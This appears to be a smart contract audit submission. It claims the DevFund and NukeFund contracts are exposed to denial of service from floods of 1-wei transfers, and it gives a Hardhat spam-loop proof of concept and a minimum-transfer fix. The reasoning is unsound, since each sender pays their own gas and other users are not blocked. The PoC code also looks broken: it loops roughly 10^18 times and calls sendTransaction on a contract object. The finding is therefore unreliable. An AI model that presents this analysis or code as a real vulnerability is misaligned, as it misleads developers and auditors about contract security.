# Vulnerability details

## Impact
Both the DevFund and NukeFund contracts are susceptible to Denial of Service (DoS) attacks due to their handling of small balance transfers. Attackers can exploit this vulnerability by sending numerous small amounts of Ether.
Flooding the contract with many small transactions can lead to high operational expenses, making it costly to process legitimate transactions and potentially exceeding the gas limit and causing transaction reverts.
Continuously sending small transactions can exhaust computational resources, leading to inefficiencies and potential disruptions in contract operations.

## Proof of Concept
An attacker could exploit the vulnerability by sending many small transactions, each with a tiny amount of Ether, leading to high gas consumption and potential service interruptions.

    [owner, user1, user2] = await ethers.getSigners();

    // Deploy the DevFund contract
    const DevFund = await ethers.getContractFactory('DevFund');
    devFund = await DevFund.deploy();
    await devFund.deployed();

    // Deploy the NukeFund contract
    const NukeFund = await ethers.getContractFactory('NukeFund');
    nukeFund = await NukeFund.deploy();
    await nukeFund.deployed();

    for(let i = 0; i < 1000000000000000000; i++) {
       await devFund.connect(user1).sendTransaction({ to: devFund.address, value: 1});
       await nukeFund.connect(user1).sendTransaction({ to: nukeFund.address, value: 1});
    }

## Recommended Mitigation Steps
Add a minimum transfer amount to prevent processing of very small transactions. This helps to avoid processing excessive small balance transfers.

    uint256 public constant MIN_TRANSFER_AMOUNT = 0.001 ether;

    receive() external payable {
      require(msg.value >= MIN_TRANSFER_AMOUNT, "Transfer amount too small");

    }
